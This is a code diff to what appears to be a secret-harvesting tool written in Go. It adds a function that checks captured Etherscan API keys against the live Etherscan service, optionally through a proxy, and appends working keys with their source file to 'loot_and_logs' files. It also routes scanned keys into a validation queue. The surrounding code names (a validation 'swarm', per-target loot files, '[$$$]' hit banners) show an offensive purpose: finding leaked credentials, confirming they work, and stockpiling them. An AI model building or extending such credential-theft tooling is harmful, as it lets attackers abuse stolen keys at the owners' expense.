@@ -138,6 +138,8 @@ func initValidationSwarm() {
 						testAwsLive(job.Key1, job.Key2, job.Proxy)
 					case "dataforseo":
 						testDataForSeoLive(job.Key1, job.Key2, job.Proxy)
+					case "etherscan_pro":
+						validateEtherscanLive(job.Key1, job.Key2, job.Proxy)
 					// Phase 46 Database Active Checkers
 					case "mongodb":
 						testMongoDbLive(job.Key1)
@@ -2009,6 +2011,52 @@ func testCoinbaseLive(apiKey, secret, proxyStr string) {
 	}
 }
 
+func validateEtherscanLive(apiKey, source, proxyStr string) {
+	if len(apiKey) != 34 {
+		return
+	}
+	apiReqUrl := fmt.Sprintf("https://api.etherscan.io/api?module=proxy&action=eth_blockNumber&apikey=%s", apiKey)
+	req, _ := http.NewRequest("GET", apiReqUrl, nil)
+	client := &http.Client{Timeout: 10 * time.Second}
+	
+	if proxyStr != "" {
+		if proxyURL, pErr := url.Parse(proxyStr); pErr == nil {
+			client.Transport = &http.Transport{Proxy: http.ProxyURL(proxyURL)}
+		}
+	}
+	
+	resp, err := client.Do(req)
+	if err != nil {
+		return
+	}
+	defer resp.Body.Close()
+	
+	bodyBytes, _ := ioutil.ReadAll(resp.Body)
+	bodyStr := string(bodyBytes)
+	
+	if strings.Contains(bodyStr, "result") && !strings.Contains(bodyStr, "Invalid API Key") {
+		fmt.Printf("%s      [$$$] ETHERSCAN API VALIDATED! Live Subgraph Access Confirmed!%s\n", colorGreen, colorReset)
+		
+		os.MkdirAll("brain/loot_and_logs/Uncategorized/WEB3_RPC_NODES", 0755)
+		poolFile := "brain/loot_and_logs/Uncategorized/WEB3_RPC_NODES/ETHERSCAN.txt"
+		f, _ := os.OpenFile(poolFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+		f.WriteString(apiKey + "\n")
+		f.Close()
+
+		os.MkdirAll("brain/loot_and_logs/Uncategorized/WEB3_DATA_APIS", 0755)
+		hitFile := "brain/loot_and_logs/Uncategorized/WEB3_DATA_APIS/VALID_HITS.md"
+		if globalTargetContext != "" {
+			hitFile = fmt.Sprintf("brain/loot_and_logs/%s_web3_data.md", globalTargetContext)
+		}
+		fHit, _ := os.OpenFile(hitFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+		logEntry := fmt.Sprintf("============= [ETHERSCAN_PRO LIVE VALIDATED] =============\nAPI Identity: %s\nSource File: %s\n\n", apiKey, source)
+		fHit.WriteString(logEntry)
+		fHit.Close()
+	} else {
+		fmt.Printf("%s      [-] Revoked Etherscan API Key dropped.%s\n", colorDim, colorReset)
+	}
+}
+
 func testOpenRouterLive(key, proxyStr string) {
 	fmt.Printf("%s      [HMAC] Validating OpenRouter API Token...%s\n", colorYellow, colorReset)
 	client := getClient(proxyStr)
@@ -2773,25 +2821,21 @@ func checkContentForSecrets(content, source string, client *http.Client, proxy s
 				}
 				
 				if !isDuplicate(capturedKey) {
-					fmt.Printf("%s    [!] DATA INDEXING VALIDATOR! (%s) Web3 Analytics & DEX Router Key Discovered!%s\n", colorRed, strings.ToUpper(provider), colorReset)
-					
-					os.MkdirAll("brain/loot_and_logs/Uncategorized/WEB3_DATA_APIS", 0755)
-					hitFile := "brain/loot_and_logs/Uncategorized/WEB3_DATA_APIS/VALID_HITS.md"
-					if globalTargetContext != "" {
-						hitFile = fmt.Sprintf("brain/loot_and_logs/%s_web3_data.md", globalTargetContext)
-					}
-
-					f, _ := os.OpenFile(hitFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
-					logEntry := fmt.Sprintf("============= [%s WEB3 DATA/DEX AGGREGATOR] =============\nRelayer API Identity: %s\nSource File: %s\n\n", strings.ToUpper(provider), capturedKey, source)
-					f.WriteString(logEntry)
-					f.Close()
-
 					if provider == "etherscan_pro" {
-						os.MkdirAll("brain/loot_and_logs/Uncategorized/WEB3_RPC_NODES", 0755)
-						poolFile := "brain/loot_and_logs/Uncategorized/WEB3_RPC_NODES/ETHERSCAN.txt"
-						pf, _ := os.OpenFile(poolFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
-						pf.WriteString(capturedKey + "\n")
-						pf.Close()
+						dispatchValidationJob(ValidationJob{Provider: "etherscan_pro", Key1: capturedKey, Key2: source, Proxy: proxy})
+					} else {
+						fmt.Printf("%s    [!] DATA INDEXING VALIDATOR! (%s) Web3 Analytics & DEX Router Key Discovered!%s\n", colorRed, strings.ToUpper(provider), colorReset)
+						
+						os.MkdirAll("brain/loot_and_logs/Uncategorized/WEB3_DATA_APIS", 0755)
+						hitFile := "brain/loot_and_logs/Uncategorized/WEB3_DATA_APIS/VALID_HITS.md"
+						if globalTargetContext != "" {
+							hitFile = fmt.Sprintf("brain/loot_and_logs/%s_web3_data.md", globalTargetContext)
+						}
+
+						f, _ := os.OpenFile(hitFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+						logEntry := fmt.Sprintf("============= [%s WEB3 DATA/DEX AGGREGATOR] =============\nRelayer API Identity: %s\nSource File: %s\n\n", strings.ToUpper(provider), capturedKey, source)
+						f.WriteString(logEntry)
+						f.Close()
 					}
 				}
 			}
